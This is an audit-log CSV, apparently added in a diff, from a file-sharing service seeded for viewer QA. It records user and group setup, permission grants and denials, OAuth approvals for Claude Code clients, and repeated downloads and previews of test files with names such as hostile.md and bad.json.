+2026-11-13T06:31:20.900070Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/hostile.md,web,True,127.0.0.1,{}
+2026-11-13T06:31:18.624065Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/hostile.md,web,True,127.0.0.1,{}
+2026-11-13T06:31:17.048851Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/empty.md,web,True,127.0.0.1,{}
+2026-11-13T06:31:15.484616Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/bad.json,web,True,127.0.0.1,{}
+2026-11-13T06:31:09.202227Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/big.csv,web,True,127.0.0.1,{}
+2026-11-13T06:31:07.629960Z,maya,Maya Okafor,file.preview,/users/maya/inbox/viewer/doc.pdf,web,True,,"{""size"": 193}"
+2026-11-13T06:31:06.048970Z,maya,Maya Okafor,file.preview,/users/maya/inbox/viewer/pic.png,web,True,,"{""size"": 135}"
+2026-11-13T06:31:04.487025Z,maya,Maya Okafor,file.preview,/users/maya/inbox/viewer/pic.svg,web,True,,"{""size"": 212}"
+2026-11-13T06:31:02.906424Z,maya,Maya Okafor,file.preview,/users/maya/inbox/viewer/page.html,web,True,,"{""size"": 286}"
+2026-11-13T06:31:02.899986Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/page.html,web,True,127.0.0.1,{}
+2026-11-13T06:31:01.321531Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/script.py,web,True,127.0.0.1,{}
+2026-11-13T06:30:59.738780Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/data.json,web,True,127.0.0.1,{}
+2026-11-13T06:30:58.165546Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/data.csv,web,True,127.0.0.1,{}
+2026-11-13T06:30:56.584808Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/hostile.md,web,True,127.0.0.1,{}
+2026-11-13T06:30:56.511636Z,maya,Maya Okafor,signin.password,maya,web,True,127.0.0.1,{}
+2026-11-13T06:30:49.611111Z,maya,Maya Okafor,file.preview,/users/maya/inbox/viewer/page.html,web,True,,"{""size"": 286}"
+2026-11-13T06:30:49.604065Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/page.html,web,True,127.0.0.1,{}
+2026-11-13T06:30:48.362436Z,maya,Maya Okafor,file.preview,/users/maya/inbox/viewer/pic.png,web,True,,"{""size"": 135}"
+2026-11-13T06:30:47.103615Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/data.csv,web,True,127.0.0.1,{}
+2026-11-13T06:30:45.868238Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/hostile.md,web,True,127.0.0.1,{}
+2026-11-13T06:30:44.291575Z,jonas,Jonas Lindqvist,file.download,/users/maya/inbox/viewer/data.csv,web,True,127.0.0.1,{}
+2026-11-13T06:30:44.239881Z,jonas,Jonas Lindqvist,signin.password,jonas,web,True,127.0.0.1,{}
+2026-11-13T06:30:43.976482Z,maya,Maya Okafor,grant.set,/users/maya/inbox/viewer,web,True,127.0.0.1,"{""principal"": ""user:jonas"", ""role"": ""viewer""}"
+2026-11-13T06:30:40.867955Z,maya,Maya Okafor,denied,/users/jonas/inbox,web,False,127.0.0.1,"{""needed"": ""viewer"", ""op"": ""open files""}"
+2026-11-13T06:30:37.737905Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/my report (final) 'v2'.md,web,True,127.0.0.1,{}
+2026-11-13T06:30:36.502695Z,maya,Maya Okafor,item.delete,/users/maya/projects/ops-renamed.md,web,True,127.0.0.1,"{""files"": 1, ""trash"": ""be10528c32184c5ab228e1f15ccb1f41""}"
+2026-11-13T06:30:33.879548Z,maya,Maya Okafor,file.download,/users/maya/projects/ops-renamed.md,web,True,127.0.0.1,{}
+2026-11-13T06:30:33.857161Z,maya,Maya Okafor,item.move,/users/maya/inbox/viewer/ops-renamed.md,web,True,127.0.0.1,"{""to"": ""/users/maya/projects/ops-renamed.md""}"
+2026-11-13T06:30:32.636894Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/ops-renamed.md,web,True,127.0.0.1,{}
+2026-11-13T06:30:32.615077Z,maya,Maya Okafor,item.move,/users/maya/inbox/viewer/ops.md,web,True,127.0.0.1,"{""to"": ""/users/maya/inbox/viewer/ops-renamed.md""}"
+2026-11-13T06:30:31.340840Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/ops.md,web,True,127.0.0.1,{}
+2026-11-13T06:30:31.291148Z,maya,Maya Okafor,file.save,/users/maya/inbox/viewer/ops.md,web,True,127.0.0.1,"{""version"": 1, ""size"": 5, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:30:29.526475Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/my report (final) 'v2'.md,web,True,127.0.0.1,{}
+2026-11-13T06:30:29.480363Z,maya,Maya Okafor,file.save,/users/maya/inbox/viewer/my report (final) 'v2'.md,web,True,127.0.0.1,"{""version"": 1, ""size"": 3, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:30:27.715709Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/hostile.md,web,True,127.0.0.1,{}
+2026-11-13T06:30:26.881236Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/data.csv,web,True,127.0.0.1,{}
+2026-11-13T06:30:26.087768Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/data.csv,web,True,127.0.0.1,{}
+2026-11-13T06:30:25.068790Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/data.csv,web,True,127.0.0.1,{}
+2026-11-13T06:30:22.886132Z,maya,Maya Okafor,file.preview,/users/maya/inbox/viewer/page.html,web,True,,"{""size"": 286}"
+2026-11-13T06:30:22.885222Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/page.html,web,True,127.0.0.1,{}
+2026-11-13T06:30:19.565753Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/data.csv,web,True,127.0.0.1,{}
+2026-11-13T06:30:18.524968Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/data.csv,web,True,127.0.0.1,{}
+2026-11-13T06:30:17.302164Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/data.csv,web,True,127.0.0.1,{}
+2026-11-13T06:30:15.288542Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/script.py,web,True,127.0.0.1,{}
+2026-11-13T06:30:15.263483Z,maya,Maya Okafor,file.restore_version,/users/maya/inbox/viewer/script.py,web,True,127.0.0.1,"{""restored"": 1}"
+2026-11-13T06:30:15.261474Z,maya,Maya Okafor,file.save,/users/maya/inbox/viewer/script.py,web,True,127.0.0.1,"{""version"": 4, ""size"": 70, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:30:12.888778Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/script.py,web,True,127.0.0.1,{}
+2026-11-13T06:30:12.835862Z,maya,Maya Okafor,file.preview,/users/maya/inbox/viewer/doc.pdf,web,True,,"{""size"": 193}"
+2026-11-13T06:30:11.318583Z,maya,Maya Okafor,file.preview,/users/maya/inbox/viewer/doc.pdf,web,True,,"{""size"": 193}"
+2026-11-13T06:30:09.787048Z,maya,Maya Okafor,file.preview,/users/maya/inbox/viewer/pic.svg,web,True,,"{""size"": 212}"
+2026-11-13T06:30:07.747186Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/page.html,web,True,127.0.0.1,{}
+2026-11-13T06:30:07.746222Z,maya,Maya Okafor,file.preview,/users/maya/inbox/viewer/page.html,web,True,,"{""size"": 286}"
+2026-11-13T06:30:06.720186Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/hostile.md,web,True,127.0.0.1,{}
+2026-11-13T06:30:05.452092Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/data.json,web,True,127.0.0.1,{}
+2026-11-13T06:30:03.449670Z,maya,Maya Okafor,file.preview,/users/maya/inbox/viewer/page.html,web,True,,"{""size"": 286}"
+2026-11-13T06:30:03.441442Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/page.html,web,True,127.0.0.1,{}
+2026-11-13T06:30:01.424696Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/data.json,web,True,127.0.0.1,{}
+2026-11-13T06:29:59.393465Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/data.csv,web,True,127.0.0.1,{}
+2026-11-13T06:29:57.373928Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/hostile.md,web,True,127.0.0.1,{}
+2026-11-13T06:29:56.171585Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/hostile.md,web,True,127.0.0.1,{}
+2026-11-13T06:29:53.882772Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/hostile.md,web,True,127.0.0.1,{}
+2026-11-13T06:29:52.320603Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/empty.md,web,True,127.0.0.1,{}
+2026-11-13T06:29:50.757250Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/bad.json,web,True,127.0.0.1,{}
+2026-11-13T06:29:44.440036Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/big.csv,web,True,127.0.0.1,{}
+2026-11-13T06:29:42.873893Z,maya,Maya Okafor,file.preview,/users/maya/inbox/viewer/doc.pdf,web,True,,"{""size"": 193}"
+2026-11-13T06:29:41.306924Z,maya,Maya Okafor,file.preview,/users/maya/inbox/viewer/pic.png,web,True,,"{""size"": 135}"
+2026-11-13T06:29:39.737314Z,maya,Maya Okafor,file.preview,/users/maya/inbox/viewer/pic.svg,web,True,,"{""size"": 212}"
+2026-11-13T06:29:38.175510Z,maya,Maya Okafor,file.preview,/users/maya/inbox/viewer/page.html,web,True,,"{""size"": 286}"
+2026-11-13T06:29:38.168678Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/page.html,web,True,127.0.0.1,{}
+2026-11-13T06:29:36.595504Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/script.py,web,True,127.0.0.1,{}
+2026-11-13T06:29:35.027397Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/data.json,web,True,127.0.0.1,{}
+2026-11-13T06:29:33.440643Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/data.csv,web,True,127.0.0.1,{}
+2026-11-13T06:29:31.868112Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/hostile.md,web,True,127.0.0.1,{}
+2026-11-13T06:29:31.796355Z,maya,Maya Okafor,signin.password,maya,web,True,127.0.0.1,{}
+2026-11-13T06:29:29.531193Z,jonas,Jonas Lindqvist,oauth.deny,Claude Code,web,True,127.0.0.1,{}
+2026-11-13T06:29:27.846915Z,jonas,Jonas Lindqvist,oauth.approve,Claude Code on Jonas’s Linux machine,web,True,127.0.0.1,{}
+2026-11-13T06:29:26.146399Z,jonas,Jonas Lindqvist,oauth.approve,Edited name,web,True,127.0.0.1,{}
+2026-11-13T06:29:26.039532Z,jonas,Jonas Lindqvist,signin.password,jonas,web,True,127.0.0.1,{}
+2026-11-13T06:29:23.802575Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/data.csv,web,True,127.0.0.1,{}
+2026-11-13T06:29:22.180192Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/data.csv,web,True,127.0.0.1,{}
+2026-11-13T06:29:22.105054Z,maya,Maya Okafor,signin.password,maya,web,True,127.0.0.1,{}
+2026-11-13T06:29:09.224139Z,admin,Administrator,signin.password,admin,web,True,127.0.0.1,{}
+2026-11-13T06:28:59.001500Z,maya,Maya Okafor,file.save,/users/maya/inbox/viewer/empty.md,mcp,True,127.0.0.1,"{""version"": 1, ""size"": 0, ""project"": null, ""source"": ""mcp"", ""token"": ""viewer seed (\u2026FF34)""}"
+2026-11-13T06:28:58.992215Z,maya,Maya Okafor,file.save,/users/maya/inbox/viewer/bad.json,mcp,True,127.0.0.1,"{""version"": 1, ""size"": 17, ""project"": null, ""source"": ""mcp"", ""token"": ""viewer seed (\u2026FF34)""}"
+2026-11-13T06:28:58.982286Z,maya,Maya Okafor,file.save,/users/maya/inbox/viewer/noext,mcp,True,127.0.0.1,"{""version"": 1, ""size"": 29, ""project"": null, ""source"": ""mcp"", ""token"": ""viewer seed (\u2026FF34)""}"
+2026-11-13T06:28:58.972617Z,maya,Maya Okafor,file.save,/users/maya/inbox/viewer/blob.bin,mcp,True,127.0.0.1,"{""version"": 1, ""size"": 1024, ""project"": null, ""source"": ""mcp"", ""token"": ""viewer seed (\u2026FF34)""}"
+2026-11-13T06:28:58.962411Z,maya,Maya Okafor,file.save,/users/maya/inbox/viewer/huge.txt,mcp,True,127.0.0.1,"{""version"": 1, ""size"": 2097162, ""project"": null, ""source"": ""mcp"", ""token"": ""viewer seed (\u2026FF34)""}"
+2026-11-13T06:28:58.933820Z,maya,Maya Okafor,file.save,/users/maya/inbox/viewer/big.csv,mcp,True,127.0.0.1,"{""version"": 1, ""size"": 6539, ""project"": null, ""source"": ""mcp"", ""token"": ""viewer seed (\u2026FF34)""}"
+2026-11-13T06:28:58.923826Z,maya,Maya Okafor,file.save,/users/maya/inbox/viewer/script.py,mcp,True,127.0.0.1,"{""version"": 3, ""size"": 19, ""project"": null, ""source"": ""mcp"", ""token"": ""viewer seed (\u2026FF34)""}"
+2026-11-13T06:28:58.910499Z,maya,Maya Okafor,file.save,/users/maya/inbox/viewer/script.py,mcp,True,127.0.0.1,"{""version"": 2, ""size"": 19, ""project"": null, ""source"": ""mcp"", ""token"": ""viewer seed (\u2026FF34)""}"
+2026-11-13T06:28:58.899493Z,maya,Maya Okafor,file.save,/users/maya/inbox/viewer/script.py,mcp,True,127.0.0.1,"{""version"": 1, ""size"": 70, ""project"": ""viewer-qa"", ""source"": ""mcp"", ""token"": ""viewer seed (\u2026FF34)""}"
+2026-11-13T06:28:58.888567Z,maya,Maya Okafor,file.save,/users/maya/inbox/viewer/pic.svg,mcp,True,127.0.0.1,"{""version"": 1, ""size"": 212, ""project"": ""viewer-qa"", ""source"": ""mcp"", ""token"": ""viewer seed (\u2026FF34)""}"
+2026-11-13T06:28:58.877433Z,maya,Maya Okafor,file.save,/users/maya/inbox/viewer/pic.png,mcp,True,127.0.0.1,"{""version"": 1, ""size"": 135, ""project"": ""viewer-qa"", ""source"": ""mcp"", ""token"": ""viewer seed (\u2026FF34)""}"
+2026-11-13T06:28:58.866998Z,maya,Maya Okafor,file.save,/users/maya/inbox/viewer/page.html,mcp,True,127.0.0.1,"{""version"": 1, ""size"": 286, ""project"": ""viewer-qa"", ""source"": ""mcp"", ""token"": ""viewer seed (\u2026FF34)""}"
+2026-11-13T06:28:58.855249Z,maya,Maya Okafor,file.save,/users/maya/inbox/viewer/hostile.md,mcp,True,127.0.0.1,"{""version"": 1, ""size"": 1087, ""project"": ""viewer-qa"", ""source"": ""mcp"", ""token"": ""viewer seed (\u2026FF34)""}"
+2026-11-13T06:28:58.838904Z,maya,Maya Okafor,file.save,/users/maya/inbox/viewer/doc.pdf,mcp,True,127.0.0.1,"{""version"": 1, ""size"": 193, ""project"": ""viewer-qa"", ""source"": ""mcp"", ""token"": ""viewer seed (\u2026FF34)""}"
+2026-11-13T06:28:58.823596Z,maya,Maya Okafor,file.save,/users/maya/inbox/viewer/data.json,mcp,True,127.0.0.1,"{""version"": 1, ""size"": 107, ""project"": ""viewer-qa"", ""source"": ""mcp"", ""token"": ""viewer seed (\u2026FF34)""}"
+2026-11-13T06:28:58.808126Z,maya,Maya Okafor,file.save,/users/maya/inbox/viewer/data.csv,mcp,True,127.0.0.1,"{""version"": 1, ""size"": 133, ""project"": ""viewer-qa"", ""source"": ""mcp"", ""token"": ""viewer seed (\u2026FF34)""}"
+2026-11-13T06:28:58.793686Z,maya,Maya Okafor,token.create,viewer seed,web,True,127.0.0.1,"{""scope"": ""write"", ""folders"": null}"
+2026-11-13T06:28:58.785145Z,maya,Maya Okafor,signin.password,maya,web,True,127.0.0.1,{}
+2026-11-13T06:28:58.609392Z,diego,Diego Alvarez,file.save,/shared/platform-eng/dashboards/cost.html,mcp,False,127.0.0.1,"{""reason"": ""no write access"", ""size"": 11, ""token"": ""Claude Code on DIEGO-WS01 (\u2026Z_1w)""}"
+2026-11-13T06:28:58.608526Z,diego,Diego Alvarez,denied,/shared/platform-eng/dashboards,mcp,False,127.0.0.1,"{""needed"": ""editor"", ""op"": ""save files"", ""token"": ""Claude Code on DIEGO-WS01 (\u2026Z_1w)""}"
+2026-11-13T06:28:58.600849Z,diego,Diego Alvarez,oauth.token,Claude Code on DIEGO-WS01,api,True,,{}
+2026-11-13T06:28:58.593310Z,diego,Diego Alvarez,oauth.approve,Claude Code on DIEGO-WS01,web,True,127.0.0.1,{}
+2026-11-13T06:28:58.580082Z,diego,Diego Alvarez,file.save,/shared/finance/budget-2027.csv,web,True,127.0.0.1,"{""version"": 1, ""size"": 43, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:28:58.567515Z,diego,Diego Alvarez,signin.password,diego,web,True,127.0.0.1,{}
+2026-11-13T06:28:58.504453Z,jonas,Jonas Lindqvist,file.save,/users/jonas/inbox/q3-forecast.csv,web,True,127.0.0.1,"{""version"": 1, ""size"": 38, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:28:58.492866Z,jonas,Jonas Lindqvist,file.save,/shared/platform-eng/runbooks/on-call-checklist.md,web,True,127.0.0.1,"{""version"": 1, ""size"": 60, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:28:58.477167Z,jonas,Jonas Lindqvist,signin.password,jonas,web,True,127.0.0.1,{}
+2026-11-13T06:28:58.401577Z,priya,Priya Raman,grant.set,/users/priya/projects/design-system,mcp,True,127.0.0.1,"{""principal"": ""group:platform-eng"", ""role"": ""viewer"", ""token"": ""Claude Code on Priya's ThinkPad (\u2026CnbE)""}"
+2026-11-13T06:28:58.384676Z,priya,Priya Raman,file.save,/users/priya/projects/design-system/brand-tokens.json,mcp,True,127.0.0.1,"{""version"": 1, ""size"": 93, ""project"": ""design-system"", ""source"": ""mcp"", ""token"": ""Claude Code on Priya's ThinkPad (\u2026CnbE)""}"
+2026-11-13T06:28:58.366885Z,priya,Priya Raman,file.save,/shared/research/interviews/interview-synthesis.md,mcp,True,127.0.0.1,"{""version"": 1, ""size"": 95, ""project"": null, ""source"": ""mcp"", ""token"": ""Claude Code on Priya's ThinkPad (\u2026CnbE)""}"
+2026-11-13T06:28:58.349097Z,priya,Priya Raman,file.save,/shared/design/onboarding-flow.svg,mcp,True,127.0.0.1,"{""version"": 1, ""size"": 537, ""project"": ""onboarding"", ""source"": ""mcp"", ""token"": ""Claude Code on Priya's ThinkPad (\u2026CnbE)""}"
+2026-11-13T06:28:58.333373Z,priya,Priya Raman,oauth.token,Claude Code on Priya's ThinkPad,api,True,,{}
+2026-11-13T06:28:58.324661Z,priya,Priya Raman,oauth.approve,Claude Code on Priya's ThinkPad,web,True,127.0.0.1,{}
+2026-11-13T06:28:58.307385Z,priya,Priya Raman,signin.password,priya,web,True,127.0.0.1,{}
+2026-11-13T06:28:58.247609Z,maya,Maya Okafor,file.save,/shared/platform-eng/projects/latency-svc/capacity-plan.md,mcp,True,127.0.0.1,"{""version"": 2, ""size"": 300, ""project"": ""latency-svc"", ""source"": ""mcp"", ""token"": ""Claude Code on Maya's MacBook (\u2026DEHo)""}"
+2026-11-13T06:28:58.228734Z,maya,Maya Okafor,file.save,/users/maya/projects/perf-lab/perf-notes.md,mcp,True,127.0.0.1,"{""version"": 1, ""size"": 40, ""project"": ""perf-lab"", ""source"": ""mcp"", ""token"": ""Claude Code on Maya's MacBook (\u2026DEHo)""}"
+2026-11-13T06:28:58.212576Z,maya,Maya Okafor,file.save,/users/maya/inbox/scratch-notes.txt,mcp,True,127.0.0.1,"{""version"": 1, ""size"": 54, ""project"": null, ""source"": ""mcp"", ""token"": ""Claude Code on Maya's MacBook (\u2026DEHo)""}"
+2026-11-13T06:28:58.196029Z,maya,Maya Okafor,file.save,/shared/platform-eng/runbooks/incident-0412.md,mcp,True,127.0.0.1,"{""version"": 1, ""size"": 135, ""project"": null, ""source"": ""mcp"", ""token"": ""Claude Code on Maya's MacBook (\u2026DEHo)""}"
+2026-11-13T06:28:58.180069Z,maya,Maya Okafor,file.save,/shared/platform-eng/projects/latency-svc/capacity-plan.md,mcp,True,127.0.0.1,"{""version"": 1, ""size"": 300, ""project"": ""latency-svc"", ""source"": ""mcp"", ""token"": ""Claude Code on Maya's MacBook (\u2026DEHo)""}"
+2026-11-13T06:28:58.164116Z,maya,Maya Okafor,file.save,/shared/platform-eng/dashboards/error-budget.html,mcp,True,127.0.0.1,"{""version"": 1, ""size"": 1508, ""project"": ""latency-svc"", ""source"": ""mcp"", ""token"": ""Claude Code on Maya's MacBook (\u2026DEHo)""}"
+2026-11-13T06:28:58.148096Z,maya,Maya Okafor,file.save,/shared/platform-eng/dashboards/latency-dashboard.html,mcp,True,127.0.0.1,"{""version"": 1, ""size"": 1513, ""project"": ""latency-svc"", ""source"": ""mcp"", ""token"": ""Claude Code on Maya's MacBook (\u2026DEHo)""}"
+2026-11-13T06:28:58.124902Z,maya,Maya Okafor,oauth.token,Claude Code on Maya's MacBook,api,True,,{}
+2026-11-13T06:28:58.111296Z,maya,Maya Okafor,oauth.approve,Claude Code on Maya's MacBook,web,True,127.0.0.1,{}
+2026-11-13T06:28:58.089373Z,maya,Maya Okafor,signin.password,maya,web,True,127.0.0.1,{}
+2026-11-13T06:28:58.014859Z,admin,Administrator,routing.add,/shared/platform-eng/projects/{project},web,True,127.0.0.1,"{""match"": ""git_remote"", ""pattern"": ""git.lab.local/platform/*""}"
+2026-11-13T06:28:57.996551Z,admin,Administrator,grant.set,/shared/research,web,True,127.0.0.1,"{""principal"": ""group:platform-eng"", ""role"": ""viewer""}"
+2026-11-13T06:28:57.986666Z,admin,Administrator,grant.set,/shared/platform-eng/dashboards,web,True,127.0.0.1,"{""principal"": ""group:design"", ""role"": ""viewer""}"
+2026-11-13T06:28:57.979437Z,admin,Administrator,folder.create,/shared/research/interviews,web,True,127.0.0.1,{}
+2026-11-13T06:28:57.974166Z,admin,Administrator,folder.create,/shared/platform-eng/runbooks,web,True,127.0.0.1,{}
+2026-11-13T06:28:57.969347Z,admin,Administrator,folder.create,/shared/platform-eng/dashboards,web,True,127.0.0.1,{}
+2026-11-13T06:28:57.962229Z,admin,Administrator,group.add_member,finance,web,True,127.0.0.1,"{""user"": ""diego""}"
+2026-11-13T06:28:57.955199Z,admin,Administrator,group.create,finance,web,True,127.0.0.1,"{""source"": ""local""}"
+2026-11-13T06:28:57.938877Z,admin,Administrator,group.add_member,research,web,True,127.0.0.1,"{""user"": ""jonas""}"
+2026-11-13T06:28:57.932557Z,admin,Administrator,group.add_member,research,web,True,127.0.0.1,"{""user"": ""priya""}"
+2026-11-13T06:28:57.926762Z,admin,Administrator,group.create,research,web,True,127.0.0.1,"{""source"": ""local""}"
+2026-11-13T06:28:57.912791Z,admin,Administrator,group.add_member,design,web,True,127.0.0.1,"{""user"": ""diego""}"
+2026-11-13T06:28:57.906864Z,admin,Administrator,group.add_member,design,web,True,127.0.0.1,"{""user"": ""priya""}"
+2026-11-13T06:28:57.900148Z,admin,Administrator,group.create,design,web,True,127.0.0.1,"{""source"": ""local""}"
+2026-11-13T06:28:57.884914Z,admin,Administrator,group.add_member,platform-eng,web,True,127.0.0.1,"{""user"": ""sam""}"
+2026-11-13T06:28:57.878664Z,admin,Administrator,group.add_member,platform-eng,web,True,127.0.0.1,"{""user"": ""jonas""}"
+2026-11-13T06:28:57.867696Z,admin,Administrator,group.add_member,platform-eng,web,True,127.0.0.1,"{""user"": ""maya""}"
+2026-11-13T06:28:57.857131Z,admin,Administrator,group.create,platform-eng,web,True,127.0.0.1,"{""source"": ""local""}"
+2026-11-13T06:28:57.837419Z,admin,Administrator,user.create,diego,web,True,127.0.0.1,"{""role"": ""member"", ""source"": ""local""}"
+2026-11-13T06:28:57.758342Z,admin,Administrator,user.create,lena,web,True,127.0.0.1,"{""role"": ""auditor"", ""source"": ""local""}"
+2026-11-13T06:28:57.675343Z,admin,Administrator,user.create,sam,web,True,127.0.0.1,"{""role"": ""member"", ""source"": ""local""}"
+2026-11-13T06:28:57.594368Z,admin,Administrator,user.create,priya,web,True,127.0.0.1,"{""role"": ""member"", ""source"": ""local""}"
+2026-11-13T06:28:57.505893Z,admin,Administrator,user.create,jonas,web,True,127.0.0.1,"{""role"": ""member"", ""source"": ""local""}"
+2026-11-13T06:28:57.429381Z,admin,Administrator,user.create,maya,web,True,127.0.0.1,"{""role"": ""member"", ""source"": ""local""}"
+2026-11-13T06:28:57.333672Z,admin,Administrator,signin.password,admin,web,True,127.0.0.1,{}
+2026-11-13T06:28:56.655351Z,system,system,user.create,admin,system,True,,"{""role"": ""admin"", ""source"": ""local""}"
